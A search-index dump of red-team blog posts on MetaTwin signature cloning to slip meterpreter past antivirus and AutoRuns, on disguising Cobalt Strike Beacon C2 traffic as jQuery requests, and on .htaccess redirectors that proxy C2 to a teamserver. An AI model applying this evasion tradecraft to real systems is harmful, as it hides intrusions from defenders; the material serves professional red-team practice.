described by @subtee and @mattifestation.","title":"Overview"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#how-metatwin-works","text":"MetaTwin starts with a legitimate signed source binary, such as explorer.exe Extracts the resources ( via ResourceHacker ) and digital signature information ( via SigThief ) Writes the captured data to a target binary","title":"How MetaTwin Works"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#demo","text":"In this example, I'm simply using a default meterpreter reverse_tcp binary. Nothing special here, use any binary (.exe or .dll). Personally, we're huge fans of Cobalt Strike during real engagements. Before MetaTwin After MetaTwin As you can see, the file looks and feels like it could belong there. Storing this in a location such as c:ProgramData... with a modified time stamp, could buy a Red Team operator a bit of time and support long(er) term persistence.","title":"Demo"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#interesting-observations","text":"","title":"Interesting Observations"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#antivirus","text":"Often simple modifications can cause defensive tools to react in different ways. Of course AV is often not a show stopping defensive tool, but we were curious as to how AV handled a default Metasploit meterpreter binary when modified with MetaTwin. No obfuscation other than the addition of metadata and digital signatures. The results were interesting\u2026","title":"AntiVirus"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#default-reverse-tcp-meterpreter-binary","text":"As expected, VirusTotal reported several hits","title":"Default Reverse TCP Meterpreter Binary"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#metadata-added-to-reverse-tcp-meterpreter-binary","text":"Interestingly, adding metadata alone reduced the AV detection rate.","title":"Metadata added to Reverse TCP Meterpreter Binary"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#metadata-and-digital-signature-added-to-reverse-tcp-meterpreter-binary","text":"After adding a digital signature and the metadata, exposure dropped from 76% to 58%. This is important because we're not even trying to evade AV!","title":"Metadata and Digital Signature added to Reverse TCP Meterpreter Binary"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#sysinternals-autoruns","text":"In additions to Antivirus, you can see how default tool behavior responds to these modifications using SysInternals AutoRuns. Using the modified binary, we created simple persistence mechanism using a scheduled task. AutoRuns can be used to display this type of Windows persistence. But\u2026 the modified binary is hidden by default. Take a look\u2026","title":"SysInternals AutoRuns"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#autoruns-default-settings-hide-the-microsoft-scheduled-task","text":"","title":"AutoRuns Default Settings Hide the \"Microsoft\" scheduled task"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#takeaway","text":"Based on these observations, it's clear that some AV and EDR tools make poor assumptions based on file metadata and digital signatures that can make them less effective or confuse an inexperienced Blue Team member. Red Team operators can use this to their advantage if forced to operate from disk in future engagements.","title":"Takeaway"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#try-metatwin-yourself","text":"","title":"Try MetaTwin Yourself"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/","text":"A Deep Dive into Cobalt Strike Malleable C2 \u00b6 Joe Vest | September 5, 2018 | Tweet This Post: One of Cobalt Strike's most valuable features is its ability to modify the behavior of the Beacon payload. By changing various defaults within the framework, an operator can modify the memory footprint of Beacon, change how often it checks in, and even what Beacon's network traffic looks like. All of these features are controlled by the Malleable C2 profile, which is chosen when starting the team server. The article makes the assumption that you understand the basics of malleable C2 and is intended to be used as reference for designing and creating malleable C2 profiles. The profile found at (https://github.com/threatexpress/malleable-c2 is to used as a reference profile. It is highly documented and contains tips and guidance to aide in creating new C2 profiles. If you are new to malleable C2, we recommend starting with this reference by Jeff Dimmock (@bluscreenofjeff) https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ or reading the other references. Big thanks to @andrewchiles and @001SPARTaN for helping test and develop this C2 profile!!! Don't use defaults. Use a profile. Modify sample profiles before use. It's likely that public Malleable C2 profiles are signatured by security products. Remember you're still generating \"beaconing\" network traffic that creates a detectable pattern that is mostly independent of the chosen profile Test, Test, Test The following are quick tips to consider when setting parameter values. Follow this to reduce troubleshooting errors. Enclose parameters in double quote, not single 1 2 set useragent \"SOME AGENT\" ; # GOOD set useragent 'SOME AGENT' ; # BAD Semicolons are ok prepend \"This is an example;\" ; Escape Double quotes append \"here is \" some \" stuff\" ; Escape Backslashes append \"more \\ stuff\" ; Some special characters do not need escaping prepend \"!@#$%^&*()\" ; The example profile used in the post can be found at https://github.com/threatexpress/malleable-c2 . This C2 profile is designed to mimic a jQuery request. This javascript framework is often used by many websites and may blend into a target's network. Consider your target when deciding on what a profile to emulate. C2 traffic should blend in with normal traffic. Network traffic from a C2 profile may bypass network sensors, but you want to tune to convince a defender that traffic is legitimate. Convincing a network analyst or security team that traffic is safe is a good technique to bypass security defenses and cause analysts to ignore alerts or mark them safe. We chose to use a jQuery request to blend in. This is a generic approach and may work against wide range of targets. Start from scratch or use a template? We recommend using an existing profile and develop your own template. The jQuery profile has been tuned and tweaked as a base profile we have used for a few years. It is often used as the starting point to build new profiles. The reference profile is self-documented, but let's walk through each section\u2026 Malleable C2 References The references and guidelines described below use the Malleable C2 profile found at https://github.com/threatexpress/malleable-c2 . Profile Name \u00b6 ![][4]Choose a profile name you would like to see in your reports. This does not affect Beacon's traffic or its footprint on target. Sleep Times \u00b6 These settings control the default time between Beacon check in (in milliseconds). A new HTTP/S beacon spawned using this C2 profile will check in using the sleep time as its callback interval, plus a random amount of time up to the specified by the jitter percentage. Choose a default time that will suit your operational needs, along with any OPSEC considerations. This example uses 60 seconds. This may be too aggressive for many engagements, and some defensive products may quickly detect beaconing behavior if it is too regular. User-Agent \u00b6 Use a User-Agent value that fits with your engagement. If possible, try to capture a real User-Agent string from the target organization, to blend in with real traffic. For example, consider sending a benign e-mail with a web bug to target organization members and monitor the User-Agents sent in subsequent GET requests. If you are using plaintext HTTP traffic, or if SSL interception is in place in the target environment, a User-Agent string that doesn't match the environment can provide an indicator for defenders. SSL Certificate \u00b6 This setting controls the SSL certificate used for HTTPS communications. If possible, utilize a real, properly-issued SSL certificate for the domain you're using. LetsEncrypt can issue free SSL certificates that are trusted by all major operating systems and browsers, and will make it harder for defenders to inspect Beacon traffic. SSL certificate store creation steps are well documented in Protect your C2 Server It is generally recommended to setup your target facing HTTPS certificates on redirector hosts. This limits the reconfiguration required on your teamserver in case a domain is burned during an operation. Caveat: Some CDN providers require your origin host to maintain a valid SSL certificate and your teamserver will need a trusted SSL certificate installed for Domain Fronting to function. Refer to the Cobalt Strike documentation https://www.cobaltstrike.com/help-malleable-c2#validssl or this post by @bluscreenofjeff https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ for instructions on configuring SSL with Cobalt Strike. SpawnTo Process \u00b6 The spawnto settings control what process a beacon will spawn for post-exploitation jobs, and when using the spawn command. This command can even use command line parameters set % windir % \\ sysnative \\ svchost . exe - k localservice - p - s fdPHost The additional parameters may help a Beacon blend in more if a defender looks at the command line of running processes. It can be difficult to find good candidate to use with spawnto. Experiment and test before selecting. General Guidelines: Don't use protected binaries. How do you know if they are protected? Test Don't select binaries that executes with UAC Choose a 64 bit binary for x64 payloads and 32-bit payload for x86 payloads Consider choosing a binary that would not look strange making network connections SMB Beacons \u00b6 SMB Beacons use named pipes to communicate through a parent Beacon. This allows for peer-to-peer communication between Beacons on the same host or across the network. The SMB Beacon's pipe names can be configured. Do not use default settings, as some defensive products will look for these defaults. Try to choose something that will blend in with the target environment. Follow this link: https://www.cobaltstrike.com/help-smb-beacon for more information on SMB Beacons. DNS Beacons \u00b6 DNS Beacons use DNS for all or part of their communications. Depending on the target environment's defensive technologies, DNS traffic can be easily detected, but is often a blind spot for defenders. DNS is best used as low and slow backup channel. Change the defaults to better fit your engagement. Follow this link https://www.cobaltstrike.com/help-dns-beacon for more information on DNS Beacons. Staging Process \u00b6 \u2026 truncated\u2026 The Beacon staging process can be customized. The staging process is the stub of code used to fully load a Beacon. Read this post https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/ to learn more about the Beacon staging process. Fortunately, the HTTP characteristics of the Beacon stager can be modified. Change these settings to mimic a single legitimate HTTP request/response. In this example the requests are sent to /jquery-3.3.1.slim.min.js or /jquery-3.3.2.slim.min.js , dependent on the target process architecture, to begin the staging process. The HTTP server parameters are built to mimic a jQuery request. The Beacon commands and payloads are blended in to a chunk of the jQuery javascript text. The client makes a request that is reasonable when requesting jQuery from content delivery network. Many websites do this with http://www.google-analytics.com/ga.js \"> src=\"jquery-3.3.1.min.js\"> . The URIs can be modified to look like other CDNs. For example, you could modify the http-stager to look as if it is pulling from the Microsoft jQuery CDN. https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js In some cases, it may be better to use stageless payloads, as the staging process is an indicator that defensive products can alert on. Memory Indicators \u00b6 Some of the newest Malleable C2 features enable modification of many Beacon memory indicators. This topic can get quite deep and deserves it own blog post. Refer to https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/ and https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK for details on controlling Beacon memory indicators. This example uses the peclone tool to rip the memory metadata from explorer.exe, save as part of the Beacon payload, and uses several of the recommendations from Raphael's \"In Memory Evasion\" blogpost. HTTP GET \u00b6 \u2026 truncated\u2026 Like the http-stager section, the HTTP GET requests/responses can be modified. This section is used to check a teamserver for tasks. More information can be found here https://www.cobaltstrike.com/help-http-beacon . This profile uses a similar format found in the http-stager. The difference is the use of the cookie __cfduid= . This value contains information about the Beacon and is used by the teamserver to issue tasks. The teamserver responds with a task hidden in the jQuery javascript text. Modify this section to match the HTTP traffic you would like to use. If you choose to use a GET-only profile (see below), this is also how Beacon transmits information back to the teamserver. Note The set uri option can accept multiple URIs. This can be used to add diversity to your requests. However, Beacons will not perform requests in a round robin style as you might assume and instead a single URI from the list will be assigned to each Beacon during staging. HTTP POST \u00b6 Like the http-stager and http-get sections, the HTTP-POST requests/responses can be modified. The HTTP-POST section serves as Beacon's response to commands issued by the server and can actually be performed as a HTTP GET or HTTP POST request. This example uses an HTTP POST as shown with set verb \"POST\"; The HTTP traffic follows the same style of the HTTP-GET section and mimics a jQuery request. You can change the mode from HTTP-POST to HTTP-GET by commenting out the POST section and uncommenting the GET section of HTTP-POST. GET-Only Profiles have Trade-offs GET-Only profiles have some trade-offs and may leave you scratching your head when attempting to pull large amounts of data (i.e. download a file or take a screenshot). This is due to the way data is transmitted within the URI, URI parameters, or Headers. This side-effect is well documented by Raphael at It is important to always validate and test Malleable C2 profiles before using them on a target. A malformed profile can easily cause Beacons to fail to check in, or to not send output from tasks. Always test new C2 profiles before utilizing them in a real-world situation. C2lint \u00b6 C2lint is a tool provide with Cobalt Strike to test a profile for errors. Run this and correct errors before using on an engagement. https://www.cobaltstrike.com/help-malleable-c2 Example . / c2lint c2lint jquery - c2 . 3 . 11 . profile Manual Testing \u00b6 In addition to testing with c2lint, manually test all features of a Beacon on a test system. Quick Steps for Manual Testing and Validation Start wireshark Start a teamserver using the test profile Create a HTTP listener (named http) Create a SMB listener (named smb) Create a Scripted Web Delivery attack to stage the HTTP Beacon Attacks -> Web Drive-by -> Scripted Web Delivery Run the PowerShell on a test Windows system as an Administrator Interact with the elevated Beacon Spawn new Beacons, interact with each, and execute spawn commands: 1 2 3 4 spawn x64 http spawn x86 http spawn x64 smb spawn x86 smb Review the packet capture data to ensure the http traffic is what you expect: Review the staging process Review the http-get process Review th http-post process (even if you use GET) Execute other Beacon commands to ensure it is working as expected (at a minimum): 1 2 3 4 keylogger screenshot download upload References \u00b6 Cobalt Strike Malleable C2 Help Documents \u2013 https://www.cobaltstrike.com/help-malleable-c2 Example Profiles \u2013 https://github.com/rsmudge/Malleable-C2-Profiles Another profile reference (@bluscreenofjeff) \u2013 https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ Random profile generator (@bluscreenofjeff) \u2013 https://bluescreenofjeff.com/2017-08-30-randomized-malleable-c2-profiles-made-easy/ In-memory Evation (Raphael Mudge) \u2013 https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK Cobalt Strike 3.6 \u2013 A Path for Privilege Escalation (Raphael Mudge) \u2013 https://blog.cobaltstrike.com/2016/12/08/cobalt-strike-3-6-a-path-for-privilege-escalation/ Malleable Command and Control (Raphael Mudge) \u2013 https://blog.cobaltstrike.com/2014/07/16/malleable-command-and-control/","title":"A Deep Dive into Cobalt Strike Malleable C2"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#a-deep-dive-into-cobalt-strike-malleable-c2","text":"Joe Vest | September 5, 2018 | Tweet This Post: One of Cobalt Strike's most valuable features is its ability to modify the behavior of the Beacon payload. By changing various defaults within the framework, an operator can modify the memory footprint of Beacon, change how often it checks in, and even what Beacon's network traffic looks like. All of these features are controlled by the Malleable C2 profile, which is chosen when starting the team server. The article makes the assumption that you understand the basics of malleable C2 and is intended to be used as reference for designing and creating malleable C2 profiles. The profile found at (https://github.com/threatexpress/malleable-c2 is to used as a reference profile. It is highly documented and contains tips and guidance to aide in creating new C2 profiles. If you are new to malleable C2, we recommend starting with this reference by Jeff Dimmock (@bluscreenofjeff) https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ or reading the other references. Big thanks to @andrewchiles and @001SPARTaN for helping test and develop this C2 profile!!! Don't use defaults. Use a profile. Modify sample profiles before use. It's likely that public Malleable C2 profiles are signatured by security products. Remember you're still generating \"beaconing\" network traffic that creates a detectable pattern that is mostly independent of the chosen profile Test, Test, Test The following are quick tips to consider when setting parameter values. Follow this to reduce troubleshooting errors. Enclose parameters in double quote, not single 1 2 set useragent \"SOME AGENT\" ; # GOOD set useragent 'SOME AGENT' ; # BAD Semicolons are ok prepend \"This is an example;\" ; Escape Double quotes append \"here is \" some \" stuff\" ; Escape Backslashes append \"more \\ stuff\" ; Some special characters do not need escaping prepend \"!@#$%^&*()\" ; The example profile used in the post can be found at https://github.com/threatexpress/malleable-c2 . This C2 profile is designed to mimic a jQuery request. This javascript framework is often used by many websites and may blend into a target's network. Consider your target when deciding on what a profile to emulate. C2 traffic should blend in with normal traffic. Network traffic from a C2 profile may bypass network sensors, but you want to tune to convince a defender that traffic is legitimate. Convincing a network analyst or security team that traffic is safe is a good technique to bypass security defenses and cause analysts to ignore alerts or mark them safe. We chose to use a jQuery request to blend in. This is a generic approach and may work against wide range of targets. Start from scratch or use a template? We recommend using an existing profile and develop your own template. The jQuery profile has been tuned and tweaked as a base profile we have used for a few years. It is often used as the starting point to build new profiles. The reference profile is self-documented, but let's walk through each section\u2026 Malleable C2 References The references and guidelines described below use the Malleable C2 profile found at https://github.com/threatexpress/malleable-c2 .","title":"A Deep Dive into Cobalt Strike Malleable C2"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#profile-name","text":"![][4]Choose a profile name you would like to see in your reports. This does not affect Beacon's traffic or its footprint on target.","title":"Profile Name"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#sleep-times","text":"These settings control the default time between Beacon check in (in milliseconds). A new HTTP/S beacon spawned using this C2 profile will check in using the sleep time as its callback interval, plus a random amount of time up to the specified by the jitter percentage. Choose a default time that will suit your operational needs, along with any OPSEC considerations. This example uses 60 seconds. This may be too aggressive for many engagements, and some defensive products may quickly detect beaconing behavior if it is too regular.","title":"Sleep Times"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#user-agent","text":"Use a User-Agent value that fits with your engagement. If possible, try to capture a real User-Agent string from the target organization, to blend in with real traffic. For example, consider sending a benign e-mail with a web bug to target organization members and monitor the User-Agents sent in subsequent GET requests. If you are using plaintext HTTP traffic, or if SSL interception is in place in the target environment, a User-Agent string that doesn't match the environment can provide an indicator for defenders.","title":"User-Agent"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#ssl-certificate","text":"This setting controls the SSL certificate used for HTTPS communications. If possible, utilize a real, properly-issued SSL certificate for the domain you're using. LetsEncrypt can issue free SSL certificates that are trusted by all major operating systems and browsers, and will make it harder for defenders to inspect Beacon traffic. SSL certificate store creation steps are well documented in Protect your C2 Server It is generally recommended to setup your target facing HTTPS certificates on redirector hosts. This limits the reconfiguration required on your teamserver in case a domain is burned during an operation. Caveat: Some CDN providers require your origin host to maintain a valid SSL certificate and your teamserver will need a trusted SSL certificate installed for Domain Fronting to function. Refer to the Cobalt Strike documentation https://www.cobaltstrike.com/help-malleable-c2#validssl or this post by @bluscreenofjeff https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ for instructions on configuring SSL with Cobalt Strike.","title":"SSL Certificate"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#spawnto-process","text":"The spawnto settings control what process a beacon will spawn for post-exploitation jobs, and when using the spawn command. This command can even use command line parameters set % windir % \\ sysnative \\ svchost . exe - k localservice - p - s fdPHost The additional parameters may help a Beacon blend in more if a defender looks at the command line of running processes. It can be difficult to find good candidate to use with spawnto. Experiment and test before selecting. General Guidelines: Don't use protected binaries. How do you know if they are protected? Test Don't select binaries that executes with UAC Choose a 64 bit binary for x64 payloads and 32-bit payload for x86 payloads Consider choosing a binary that would not look strange making network connections","title":"SpawnTo Process"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#smb-beacons","text":"SMB Beacons use named pipes to communicate through a parent Beacon. This allows for peer-to-peer communication between Beacons on the same host or across the network. The SMB Beacon's pipe names can be configured. Do not use default settings, as some defensive products will look for these defaults. Try to choose something that will blend in with the target environment. Follow this link: https://www.cobaltstrike.com/help-smb-beacon for more information on SMB Beacons.","title":"SMB Beacons"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#dns-beacons","text":"DNS Beacons use DNS for all or part of their communications. Depending on the target environment's defensive technologies, DNS traffic can be easily detected, but is often a blind spot for defenders. DNS is best used as low and slow backup channel. Change the defaults to better fit your engagement. Follow this link https://www.cobaltstrike.com/help-dns-beacon for more information on DNS Beacons.","title":"DNS Beacons"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#staging-process","text":"\u2026 truncated\u2026 The Beacon staging process can be customized. The staging process is the stub of code used to fully load a Beacon. Read this post https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/ to learn more about the Beacon staging process. Fortunately, the HTTP characteristics of the Beacon stager can be modified. Change these settings to mimic a single legitimate HTTP request/response. In this example the requests are sent to /jquery-3.3.1.slim.min.js or /jquery-3.3.2.slim.min.js , dependent on the target process architecture, to begin the staging process. The HTTP server parameters are built to mimic a jQuery request. The Beacon commands and payloads are blended in to a chunk of the jQuery javascript text. The client makes a request that is reasonable when requesting jQuery from content delivery network. Many websites do this with http://www.google-analytics.com/ga.js \"> src=\"jquery-3.3.1.min.js\"> . The URIs can be modified to look like other CDNs. For example, you could modify the http-stager to look as if it is pulling from the Microsoft jQuery CDN. https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js In some cases, it may be better to use stageless payloads, as the staging process is an indicator that defensive products can alert on.","title":"Staging Process"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#memory-indicators","text":"Some of the newest Malleable C2 features enable modification of many Beacon memory indicators. This topic can get quite deep and deserves it own blog post. Refer to https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/ and https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK for details on controlling Beacon memory indicators. This example uses the peclone tool to rip the memory metadata from explorer.exe, save as part of the Beacon payload, and uses several of the recommendations from Raphael's \"In Memory Evasion\" blogpost.","title":"Memory Indicators"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#http-get","text":"\u2026 truncated\u2026 Like the http-stager section, the HTTP GET requests/responses can be modified. This section is used to check a teamserver for tasks. More information can be found here https://www.cobaltstrike.com/help-http-beacon . This profile uses a similar format found in the http-stager. The difference is the use of the cookie __cfduid= . This value contains information about the Beacon and is used by the teamserver to issue tasks. The teamserver responds with a task hidden in the jQuery javascript text. Modify this section to match the HTTP traffic you would like to use. If you choose to use a GET-only profile (see below), this is also how Beacon transmits information back to the teamserver. Note The set uri option can accept multiple URIs. This can be used to add diversity to your requests. However, Beacons will not perform requests in a round robin style as you might assume and instead a single URI from the list will be assigned to each Beacon during staging.","title":"HTTP GET"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#http-post","text":"Like the http-stager and http-get sections, the HTTP-POST requests/responses can be modified. The HTTP-POST section serves as Beacon's response to commands issued by the server and can actually be performed as a HTTP GET or HTTP POST request. This example uses an HTTP POST as shown with set verb \"POST\"; The HTTP traffic follows the same style of the HTTP-GET section and mimics a jQuery request. You can change the mode from HTTP-POST to HTTP-GET by commenting out the POST section and uncommenting the GET section of HTTP-POST. GET-Only Profiles have Trade-offs GET-Only profiles have some trade-offs and may leave you scratching your head when attempting to pull large amounts of data (i.e. download a file or take a screenshot). This is due to the way data is transmitted within the URI, URI parameters, or Headers. This side-effect is well documented by Raphael at It is important to always validate and test Malleable C2 profiles before using them on a target. A malformed profile can easily cause Beacons to fail to check in, or to not send output from tasks. Always test new C2 profiles before utilizing them in a real-world situation.","title":"HTTP POST"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#c2lint","text":"C2lint is a tool provide with Cobalt Strike to test a profile for errors. Run this and correct errors before using on an engagement. https://www.cobaltstrike.com/help-malleable-c2 Example . / c2lint c2lint jquery - c2 . 3 . 11 . profile","title":"C2lint"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#manual-testing","text":"In addition to testing with c2lint, manually test all features of a Beacon on a test system. Quick Steps for Manual Testing and Validation Start wireshark Start a teamserver using the test profile Create a HTTP listener (named http) Create a SMB listener (named smb) Create a Scripted Web Delivery attack to stage the HTTP Beacon Attacks -> Web Drive-by -> Scripted Web Delivery Run the PowerShell on a test Windows system as an Administrator Interact with the elevated Beacon Spawn new Beacons, interact with each, and execute spawn commands: 1 2 3 4 spawn x64 http spawn x86 http spawn x64 smb spawn x86 smb Review the packet capture data to ensure the http traffic is what you expect: Review the staging process Review the http-get process Review th http-post process (even if you use GET) Execute other Beacon commands to ensure it is working as expected (at a minimum): 1 2 3 4 keylogger screenshot download upload","title":"Manual Testing"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#references","text":"Cobalt Strike Malleable C2 Help Documents \u2013 https://www.cobaltstrike.com/help-malleable-c2 Example Profiles \u2013 https://github.com/rsmudge/Malleable-C2-Profiles Another profile reference (@bluscreenofjeff) \u2013 https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ Random profile generator (@bluscreenofjeff) \u2013 https://bluescreenofjeff.com/2017-08-30-randomized-malleable-c2-profiles-made-easy/ In-memory Evation (Raphael Mudge) \u2013 https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK Cobalt Strike 3.6 \u2013 A Path for Privilege Escalation (Raphael Mudge) \u2013 https://blog.cobaltstrike.com/2016/12/08/cobalt-strike-3-6-a-path-for-privilege-escalation/ Malleable Command and Control (Raphael Mudge) \u2013 https://blog.cobaltstrike.com/2014/07/16/malleable-command-and-control/","title":"References"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/","text":"Automating Apache mod_rewrite and Cobalt Strike Malleable C2 Profiles \u00b6 Joe Vest | February 1, 2018 | Tweet This Post: This post describes a script I created to convert a Cobalt Strike Malleable C2 profile to corresponding mod_rewrite rules to enable intelligent HTTP proxying for redirection of C2 traffic. The script automates the process described by well known redteamer and now co-worker \u2013 Jeff Dimmock ( @bluscreenofjeff ). Intelligent use of C2 redirectors is core to a mature C2 architecture that can withstand some gentle investigation and prodding. Developing Cobalt Strike compatible mod_rewrite rules to redirect traffic is not incredibly difficult, but there are a few Apache \"gotchas\" and the process can be error prone when dealing with multiple C2 profiles. Automation improves consistency and reduces the time needed to spin-up, test, and troubleshoot a unique and layered C2 infrastructure. It is always nice to start from a known good. Highlights of cs2modrewrite.py \u00b6 Rewrite Rules based on valid C2 URIs (HTTP GET, POST, and Stager) and specified User-Agent string. Result : Only requests to valid C2 URIs with a specified UA string will be proxied to the Team Server by default. Uses a custom Malleable C2 profile to build a .htaccess file with corresponding mod_rewrite rules Supports the most recent Cobalt Strike 3.10 profile features HTTP or HTTPS proxying to the Cobalt Strike Team Server HTTP 302 Redirection to a Legitimate Site for Non-Matching Requests Quick Start \u00b6 Usage \u00b6 The script can be found at: github - cs2modrewrite Arguments \u00b6 1 2 3 4 5 6 7 8 9 10 11 cs2modrewrite . py [ - h ] [ - i INPUTFILE ] [ - c C2SERVER ] [ - d DESTINATION ] Converts Cobalt Strike profiles to Apache mod_rewrite . htaccess file format by using the User - Agent and URI Endpoint to create rewrite rules . Make sure the profile passes a c2lint check before running this sript . optional arguments : - h , -- help show this help message and exit - i INPUTFILE C2 Profile file - c C2SERVER C2 Server ( http : // teamserver ) - d DESTINATION ( Optional ) Redirect to this URL ( http : // google . com ) Example Output \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #### Save the following as . htaccess in the root web directory ######################################## ## . htaccess START RewriteEngine On ## ( Optional ) ## Scripted Web Delivery ## Uncomment and adjust as needed # RewriteCond % { REQUEST_URI } ^/ css / style1 . css ?$ # RewriteCond % { HTTP_USER_AGENT } ^ $ # RewriteRule ^ . * $ \" http://TEAMSERVER%{REQUEST_URI} \" [ P , L ] ## Default Beacon Staging Support ( / 1234 ) RewriteCond % { REQUEST_URI } ^/ .... / ?$ RewriteCond % { HTTP_USER_AGENT } \" Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_08 \" RewriteRule ^ . * $ \" http://TEAMSERVER%{REQUEST_URI} \" [ P , L ] ## C2 Traffic ( HTTP - GET , HTTP - POST , HTTP - STAGER URIs ) ## Logic : If a requested URI AND the User - Agent matches , proxy the connection to the Teamserver ## Consider adding other HTTP checks to fine tune the check . ( HTTP Cookie , HTTP Referer , HTTP Query String , etc ) ## Refer to http : // httpd . apache . org / docs / current / mod / mod_rewrite . html ## Profile URIs RewriteCond % { REQUEST_URI } ^ ( / include / template / isx . php . *|/ wp06 / wp - includes / po . php . *|/ wp08 / wp - includes / dtcla . php . *|/ modules / mod_search . php . *|/ blog / wp - includes / pomo / src . php . *|/ includes / phpmailer / class . pop3 . php . *|/ api / 516280565958 . *|/ api / 516280565959 . * ) $ ## Profile UserAgent RewriteCond % { HTTP_USER_AGENT } \" Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_08 \" RewriteRule ^ . * $ \" https://TEAMSERVER%{REQUEST_URI} \" [ P , L ] ## Redirect all other traffic here RewriteRule ^ . * $ HTTPS : // GOHERE / ? [ L , R = 302 ] ## . htaccess END ######################################## What does this .htaccess do? \u00b6 Staging \u00b6 When Apache receives an HTTP request with the User-Agent Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_080 and a 4 character URI, it proxies the traffic to the teamserver. C2 Traffic \u00b6 When Apache receives an HTTP request with the User-Agent Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_080 and one of the following URIs ( / include / template / isx . php . _ |/ wp06 / wp - includes / po . php . _ |/ wp08 / wp - includes / dtcla . php , / modules / mod_search . php , / blog / wp - includes / pomo / src . php , / includes / phpmailer / class . pop3 . php , / api / 516280565958 , / api / 516280565959 ) it proxies the traffic to the teamserver. Catch All \u00b6 Any traffic that doesn't match a rule redirects the request using an HTTP 302 Summary \u00b6 TLDR The python script cs2modrewrite.py automates the process of creating a Malleable C2 compatible .htaccess file for intelligent redirection with Apache mod_rewrite. Try it out and feel free to give feedback and suggestions at @joevest on Twitter and on the ThreatExpress GitHub repo . For more details on developing C2 architecture, check out the Red Team Infrastructure Wiki . References \u00b6 https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/ https://twitter.com/bluscreenofjeff https://github.com/threatexpress/cs2modrewrite https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki","title":"Automating Cobalt Strike Profiles Apache mod_rewrite htaccess Files for Intelligent C2 Redirection"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#automating-apache-mod_rewrite-and-cobalt-strike-malleable-c2-profiles","text":"Joe Vest | February 1, 2018 | Tweet This Post: This post describes a script I created to convert a Cobalt Strike Malleable C2 profile to corresponding mod_rewrite rules to enable intelligent HTTP proxying for redirection of C2 traffic. The script automates the process described by well known redteamer and now co-worker \u2013 Jeff Dimmock ( @bluscreenofjeff ). Intelligent use of C2 redirectors is core to a mature C2 architecture that can withstand some gentle investigation and prodding. Developing Cobalt Strike compatible mod_rewrite rules to redirect traffic is not incredibly difficult, but there are a few Apache \"gotchas\" and the process can be error prone when dealing with multiple C2 profiles. Automation improves consistency and reduces the time needed to spin-up, test, and troubleshoot a unique and layered C2 infrastructure. It is always nice to 